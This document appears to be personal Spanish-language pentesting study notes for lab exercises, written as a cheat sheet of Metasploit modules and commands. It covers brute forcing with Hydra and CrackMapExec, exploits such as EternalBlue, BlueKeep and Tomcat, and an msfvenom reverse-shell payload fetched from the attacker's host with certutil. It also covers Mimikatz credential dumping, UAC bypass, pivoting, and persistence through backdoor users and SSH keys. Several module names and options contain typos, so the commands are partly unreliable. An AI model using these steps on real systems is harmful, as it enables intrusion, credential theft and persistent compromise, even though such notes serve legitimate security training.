#All

| COMANDOS       | FUNCION                            | +Info                                               |
| -------------- | ---------------------------------- | --------------------------------------------------- |
| *use*          | Usar un modulo                     |                                                     |
| *show options* | Ver opciones de configuracion      | Importante hacerlo una vez vamos a usar un modulo   |
| *set*          | Configurar parametros              | Se usa cuando hacemos un `show options` por ejemplo |
| *run/exploit*  | Ejecutar un exploit o modulo       |                                                     |
| *search*       | Buscar un exploit                  | Puede ser por nombre o por CVE                      |
| *getuid*       | Saber quienes somos                | En meterpreter (WINDOWS)                            |
| *sysinfo*      | Informacion del SO                 | En meterpreter (WINDOWS)                            |
| *sessions*     | Saber que sesión hay activa        |                                                     |
| *getprivs*     | Ver privilegios                    |                                                     |
| *setg*         | Dejar algo configurado por defecto | setg RHOSTS IpVictima                               |
| *payload*      | windows/meterpreter/reverse_tcp    | Payload de reverse shell windows                    |


# MODULOS #

#### FTP

| MODULO                              | FUNCION                   | Opciones | Wordlist |
| ----------------------------------- | ------------------------- | -------- | -------- |
| *auxiliary/scanner/portscan/tcp*    | Enumeración puertos TCP   |          |          |
| *auxiliary/scanner/ftp/ftp_version* | Enumeración versiones FTP |          |          |
| *auxiliary/scanner/ftp/ftp_login*   | Fuerza bruta FTP Login    |          |          |


#### SMB

| MODULO                                 | FUNCION                              | Opciones           | Wordlist |
| -------------------------------------- | ------------------------------------ | ------------------ | -------- |
| *auxiliary/scanner/smb/smb_version*    | Enumeracion versión SMB              |                    |          |
| *auxiliary/scanner/smb/smb_enumusers*  | Enumeracion usuarios SMB             |                    |          |
| *auxiliary/scanner/smb/smb_enumshares* | Enumeracion recursos compartidos SMB | set ShowFiles True |          |
| *auxiliary/scanner/smb/smb_login*      | Fuerza bruta por SMB                 |                    |          |


#### HTTP

| MODULO                                        | FUNCION                      | Opciones                                     | Wordlist |
| --------------------------------------------- | ---------------------------- | -------------------------------------------- | -------- |
| *auxiliary/scanner/http/http_version*         | Enumeración versión HTTP     |                                              |          |
| *auxiliary/scanner/http_header*               | Obtener cabeceras HTTP       |                                              |          |
| *auxiliary/scanner/http/robots.txt*           | Obtener fichero `robots.txt` |                                              |          |
| *auxiliary/scanner/http/dir_scanner*          | Enumeración de directorios   |                                              |          |
| *auxiliary/scanner/http/files.dir*            | Enumeración de ficheros      | set AUTH_URI /secure/<br>unset USERPASS_FILE |          |
| *auxiliary/scanner/htttp/apache_userdir_enum* | Enumeración de usuarios      |                                              |          |
| *axiliary/scanner/http/http_login*            | Fuerza bruta passwords       |                                              |          |

#### MySQL

| MODULO                                     | FUNCION                         | Opciones                     | Wordlist |
| ------------------------------------------ | ------------------------------- | ---------------------------- | -------- |
| *auxiliary/scanner/mysql/mysql_version*    | Enumeración versión MySQL       |                              |          |
| *auxiliary/scanner/mysql/mysql_login*      | Fuerza bruta credenciales       | set USERNAME root            |          |
| *auxiliary/admin/mysql/mysql_enum*         | Enumeración adicional con creds | set USERNAME<br>set PASSWORD |          |
| *auxiliary/admin/mysql/mysql_sql*          | Ejecutar consultas SQL          | set USERNAME<br>set PASSWORD |          |
| *auxiliary/scanner/mysql/mysql_schemadump* | Volcado general bases de datos  |                              |          |


#### SSH

| MODULO                                 | FUNCION                  | Opciones | Wordlist |
| -------------------------------------- | ------------------------ | -------- | -------- |
| *auxiliary/scanner/ssh/ssh_version*    | Enumeración versión SHH  |          |          |
| *auxiliary/scanner/ssh/ssh/enum_users* | Enumeración usuarios SSH |          |          |
| *axiliary/scanner/ssh/ssh_login*       | Fuerza bruta SSH         |          |          |


#### SMTP

| MODULO                                | FUNCION                   | Opciones | Wordlist |
| ------------------------------------- | ------------------------- | -------- | -------- |
| *auxiliary/scanner/smtp/smtp_version* | Enumeración versión SMTP  |          |          |
| *auxiliary/scanner/smtp/smtp_enum*    | Enumeración usuarios SMTP |          |          |


## EXPLOTACION
#### GLASSFISH

| MODULO                            | FUNCION               | Opciones                                    | Wordlist |
| --------------------------------- | --------------------- | ------------------------------------------- | -------- |
| *exploit/http/glassfish_deployer* | Explotación GlassFish | set payload windows/meterpreter/reverse_tcp |          |


####  ETERNABLUE

| MODULO                                     | FUNCION                 | Opciones | Wordlist |
| ------------------------------------------ | ----------------------- | -------- | -------- |
| *exploit/windows/smb/ms17_010_eternalblue* | Explotación Eternalblue |          |          |


#### WINDOWS IIS WEBDAV

Navegar a la IP victima `<IP_Victima>/webdav`

Usar [[HYDRA]] para la fuerza bruta
`hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt <IP_Victima> http-get /webdav/`

Una vez con las credenciales usaremos [[DAVTEST]]
`davtest -auth <user:password> -url http://<IP_Victima>/webdav`
Esta herramienta comprueba que tipos de archivos se pueden subir y cuales se pueden ejecutar

Accedemos a webdav desde la herramienta [[CADAVER]]
`cadaver http://<IP_Victima>/webdav`

Una vez tenemos acceso podemos navegar por los directorios, vamos a cargar una shell usaremos las por defecto de Kali que se encuentran en `/usr/share/webshells`, se cargan con el comando `put` y la ruta completa de la shell

| MODULO                                      | FUNCION            | Opciones | Wordlist |
| ------------------------------------------- | ------------------ | -------- | -------- |
| *exploit/windows/iis/iis_webdav_upload_asp* | Explotacion WebDav |          |          |


#### BLUEKEEP

| MODULO                                           | FUNCION              | Opciones                    | Wordlist |
| ------------------------------------------------ | -------------------- | --------------------------- | -------- |
| *auxiliary/scanner/rdp/cve_2019_0708_bluekeep*   | Enumeración BlueKeep |                             |          |
| *exploit/windows/rdp/cve_2019_0708_bluekeep_rce* | Explotación BlueKeep | show targets<br>set targets |          |


#### SMB 

| MODULO                            | FUNCION                 | Opciones               | Wordlist |
| --------------------------------- | ----------------------- | ---------------------- | -------- |
| *auxiliary/scanner/smb/smb_login* | Enumeración SMB         | USER_FILE<br>PASS_FILE |          |
| *exploit/windows/smb/psexec*      | Explotación/Entrar  SMB |                        |          |
##### Forma manual
Una vez obtenemos usuario y contraseña usamos PSEXEC.PY 
`psexec.py <user>@<IP_Victima> cmd.exe`


#### RDP
| MODULO                               | FUNCION         | Opciones | Wordlist |
| ------------------------------------ | --------------- | -------- | -------- |
| *auxiliary/scanner/rdp/rdp_esscaner* | Enumeración RDP |          |          |
Usaremos [[HYDRA]] para hacer fuerza bruta contra el RDP
`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<IP_victima> -s <puerto>`

Obtenemos la contraseña y accedemos al servicio
En caso de que use xfreerdp
![[Pasted image 20250221124743.png]]

#### SHELLSHOCK

| MODULO                                            | FUNCION                | Opciones                    | Wordlist |
| ------------------------------------------------- | ---------------------- | --------------------------- | -------- |
| *exploit/multi/http/apache_mod_cgi_bash_env_exec* | Explotación SHELLSHOCK | set Targeturi  /gettime.cgi |          |


#### WINRM

Usaremos la herramienta de [[CRACKMAPEXEC-NETEXEC]]
`crackmapexec winrm 10.2.18.45 -u administrator -p /usr/share/metasploit-framework/dat/wordlists/unix_passwords.txt`

Nos muestra el usuario y la contraseña, para poder ejecutar comandos en el servicio usaremos de nuevo [[CRACKMAPEXEC-NETEXEC]]
`crackmapexec winrm <IP_victinma> -u administrador -p <password> -x "<comando>"`

Si queremos obtener una sesión con una shell usaremos EVIL-WINRM.RB
`evil-winrm.rb -u <user> -p '<password'> -i <IP_victima>`
Se nos establecerá una shell.

Para hacerlo con [[METASPLOIT]]

| MODULO                                       | FUNCION           | Opciones                               | Wordlist |
| -------------------------------------------- | ----------------- | -------------------------------------- | -------- |
| *auxiliary/scanner/winrm/win_rm_auth_method* | Escaneo WINRM     |                                        |          |
| *auxiliary/scanner/winrm/winrm_login*        | Escaneo WINRM     |                                        |          |
| *exploit/windows/winrm/winrm_script_exec*    | Explotación WINRM | FORCE_VBS true<br>USERNAME<br>PASSWORD |          |

#### HTTPFILESERVER HSF

| MODULO                                  | FUNCION                    | Opciones | Wordlist |
| --------------------------------------- | -------------------------- | -------- | -------- |
| *exploit/windows/http/rejetto_hfs_exec* | Explotación HTTPFILESERVER |          |          |


#### APACHE TOMACAT

| MODULO                                        | FUNCION            | Opciones                                             | Wordlist |
| --------------------------------------------- | ------------------ | ---------------------------------------------------- | -------- |
| *exploit/multi/http/tomcat_jsp_upload_bypass* | Explotación TOMCAT | set payload java/jsp_shell_bind_tcp<br>set SHELL cmd |          |
Una vez establecida la sesión la pondremos en segundo plano y crearemos un payload con [[MSFVENOM]]
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_local> LPPOR=1234 -f exe > meterpreter.exe`

Levantaremos un servicio con python3
`python3 -m http.server 80`

Desde la sesión obtenida en el exploit usaremos el siguiente comando para obtener el archivo del servidor de python3
`certutil -urlcache -f http://<IP_Atcante>/meterpreter.exe meterpreter.exe`

Una vez obtenido, en una pestaña nueva abriremos [[METASPLOIT]] y usaremos el modulo
`use multi/handler`
`set payload windows/meterpreter/reverse_tcp`
`set LHOST <IP_Atacante>`
`set LPORT 1234`
`run`

En la maquina en la que hemos cargado el .exe lo ejecutamos con `.\meterprteter.exe`

Y obtendremos una sesión de meterpreter en la nueva pestaña con el multi/handler


#### MSSQL

| MODULO                                     | FUNCION           | Opciones                                        | Wordlist |
| ------------------------------------------ | ----------------- | ----------------------------------------------- | -------- |
| *exploit/windows/mssql/mssql_clr_payload * | Explotacion MSSQL | set PAYLOAD windows/x64/meterpreter/reverse_tcp |          |


#### VSFTPD

| MODULO                                 | FUNCION            | Opciones | Wordlist |
| -------------------------------------- | ------------------ | -------- | -------- |
| *exploit/unix/ftp/vsftpd_234_backdoor* | Explotación VSFTPD |          |          |
Una vez obtenida la sesion la ponemos en backgorund con `ctrl + z` y usamos el modulo.
`use post/multi/manage/shell_to_meterpreter`


#### SAMBA

| MODULO                                  | FUNCION           | Opciones | Wordlist |
| --------------------------------------- | ----------------- | -------- | -------- |
| *exploit/linux/samba/is_known_pipename* | Explotacion SAMBA |          |          |
Una vez obtenida la sesión la ponemos en backgorund con `ctrl + z` y usamos el modulo.
`use post/multi/manage/shell_to_meterpreter`


#### LIBSHH SERVER

| MODULO                                      | FUNCION            | Opciones           | Wordlist |
| ------------------------------------------- | ------------------ | ------------------ | -------- |
| *auxiliaryu/scanner/ssh/libssh_auth_bypass* | Enumeracion LIBSSH | Set SPAWN_PTY true |          |
Se nos genera una sesión en background la cual debemos ejecutar usando `sessions <num>`
Una vez obtenida la sesión la ponemos en backgorund con `ctrl + z` y usamos el modulo.
`use post/multi/manage/shell_to_meterpreter`


#### SMTP

| MODULO                      | FUNCION            | Opciones                                                                                                     | Wordlist |
| --------------------------- | ------------------ | ---------------------------------------------------------------------------------------------------------- | -------- |
| *exploit/linux/smtp/haraka* | Enumeracion LIBS set SRVPORT 9898<br>set email_to root@attackdefense.test<br>set PAYLOAD linux/x64/meterpreter_reverse_http D  D  |          |



## POST EXPLOTATION WINDOWS

`sysinfo` ver información del sistema
`getuid` ver usuario actual en el sistema
`getprivs` ver privilegios actuales
`getsystem` elevar privilegios
`hashdump` volcado de hashes
`show_mount` ver discos
`ps` árbol de procesos
`migrate <num>` migrar a otros procesos de Windows

### Escalada Privilegios Windows
##### ByPass UAC

En la ejecución del exploit que vayamos a usar tendremos que poner el payload
`set payload windows/x64/meterpreter/reverse_tcp`

Usaremos el comando `getsystem` para ver si podemos elevar privilegios, si no podemos debemos ejecutar `getprivs` para ver los privilegios actuales

Deberemos usar una shell con el comando `shell`
Para ver los usuarios del sistema usaremos `net users`
Para mostrar que usuarios pertenecen al grupo de Administrators usaremos `net localgroup administrators`

Una vez con toda esta información mandamos la sesión a background y usaremos el modulo
`use exploit/windows/local/bypassuac_injection`
`set payload windows/x64/meterpreter/reverse_tcp`
`set LPORT 4433`
`set TARGET Windows\ x64`

Una vez obtenida la sesion de meterpreter usaremos el comando `getsystyem` para elevar privilegios


##### Token Impersonation With Incognito

En la ejecución del exploit que vayamos a usar tendremos que poner el payload
`set payload windows/x64/meterpreter/reverse_tcp`

Una vez tenemos la sesión de meterpreter ejecutamos el comando `getprivs` y vemos que podemos realizar la suplantación de identidad `SeImpersonatePrivilege` 
Para la escalada ejecutamos `load incognito`
Ejecutamos `list_tokes -u` para listar los tokens
Vemos que esta el token del administrador y para hacernos pasar por el deberemos impersonar su token para ello ejecutamos
`impersonate_token "<Nombre_token>"`
Migramos al proceso de explores.exe usando el comando `ps` y luego `migrate <num>` y ya obtendremos la escalada de privilegios como Administrador.


### Volcado de hashes con Mimikatz

Una vez dentro de la sesión de meterpreter deberemos hacer un `getuid` para ver que usuarios somos y que privilegios tenemos
Una vez listo migraremos si es posible a `LSASS` para buscar el proceso usamos `pgrep lsass` y una vez tengamos el código `migrate <num>` 
Deberemos de cargar kiwi con `load kiwi`
Para hacer un volcado de todas las credenciales usaremos `creds_all`, también lo podemos hacer con `lsa_dump_sam` y `las_dump_secrets` para volcar las secretas
Cargamos mimikatz con
`upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
Cargamos una shell con el comando `shell` y ejecutamos mimikatz con `./mimikatz.exe`
Usaremos el comando `sekurlsa::logonpasswords` nos mostrara las contraseñas


### PERSISTENCIA WINDOWS

Una vez tenemos la sesion de meterpreter la ponemos en background y usamos el siguiente modulo
`use exploit/windows/local/persistence_service`
`set payload windows/meterpreter/reverse_tcp`


### HABILITAR RDP

Una vez establecida una sesion de meterpreter, si tenemos cuenta como Administrator deberemos de cambiar la contraseña con `net user administrator password1234`, ponemos la sesion en background con `ctrl + z` y usamos el modulo de post explotacion `post/windows/manage/enable_rdp`.
En una pestaña nueva usamos `xfreerdp /u:administrator /p:password1234 /v:<IP_Victima>`


## PIVOTING
### WINDOWS

El entorno se basa en la maquina atacante con `<IP_Atcante> 192.168.1.2` una maquina que vemos en la red `192.168.1.3 <IP_Victima1> 10.10.10.2` y una maquina que no vemos en la red pero si se conecta con la Victima1 `10.10.10.3 <IP_Victima2>`

Una vez tenemos la seision de meterpreter hacemos la enumeracion del systema operativo.
Deberemos empezar haciendo un `ipconfig` para ver las interfaces de red, vemos que tiene una ip dentro de un rango que no es el de nuestra maquina atacante.

Tendremos que usar el comando `run autoroute -s 10.10.10.0/24<Subnet_Encontrada>` ponemos la sesion en background y si queremos para ubicarnos mejor podemos renombrar la sesion usando el comando `sessions -n victim-1 -i <num_sesion>`.

Usaremos le modulo `auxiliary/scanner/portscan/tcp` configuraremos el `RHOST` con la IP de la maquina encontrada en la red interna de la victima1 y `set PORTS 1-100`.

Con los puetos que hayamos encntrado abrimos de nuevo la seison que estaba en background y hacemos un renvio de puertos de la maquina victima2 a la maquina victima1 con el comando `portfw add -l 1122<puerto_local> -p <puerto_objetivo> -r <IP_Victima2>`

Ahora ya podremos hacer un escaneo con [[NMAP]] a nuestro puerto de la maquina local `1122` para ver que servicio esta corriendo y poder explotarlo con [[METASPLOIT]]



## POST EXPLOTATION LINUX

`sysinfo` ver información del sistema
`getuid` ver usuario actual en el sistema
`shell` ejecutar shell `/bin/bash -i` crear bash
`ps aux` ver procesos
`env` variables de entorno
Podemos usar el modulo de `post/linux/gather/enum_configs` veremos las configuraciones del sistema
`sessions -u <num>` upgradear la sesion a meterpreter

### Escalada Privilegios Linux

##### CHKRootKit

Si al ver los procesos que stan ejecutando `ps aux` vemos un proceso llamado `/bin/check-down` le hacemos un cat `cat /bin/check-down` y vemos que hay un chkrootkit, usaremos el comando `chkrootkit -v` para ver la version
Ponemos la sesion en background y usamos el modulo de explotacion `exploit/unix/local/chkrootkit`, tenemos que indicar la ruta con `set CHKROOTKIT /bin/chkrootkit`, poner la sesion en la que esta corriendo el meterpreter y configurar el `LHOST`.  Obtendremos una sesion como root.


### Volcado de Hashes Linux

Cuando obtengamos u na sesion la deberemos de poner en background y upgradearla con `sessions -u <num>`.
usaremos el module de post explotacion llamado `post/linux/gather/hashdump` en el debemos de indicar la sesion upgradeada.
Una vez lo ejecutemos nos muestra dorde se ha guardado el dump de las contraseñas y lo podemos ver y asi poder iniciar sesion como root.


### Persistencia en Linux

Cuando obtengamos una sesion la deberemos de poner en background y upgradearla con `sessions -u <num>`, y ejecutar esa sesion.
Una vez dentro podemos crar un usuario con `useradd -u 15 -m <user> -s /bin/bash` y le establecemos una contraseña con `passwd <user>` si somos root le añadimos al grupo de root con `usermod -aG root <user>`, lo ponemos en background
Utilizaremos el modulo de explotacion de persistencia `use exploit/linux/local/sshkey_persistence`. Configuramos `CREATEFOLDER true` y la session en la que se esta ejecutando. Ejecutamos `loot` para ver la ruta donde se ha guardado, le hacemos un cat y nos muestra la RSA PRIVATE KEY. Lo guardamos en un archivo llamdo `ssh_key` le damos los siguientes permisos `chmod 0400 ssh_key`. Conectamos con la victima via SSH con `ssh -i ssh_key <user>@<IP_Victima>`

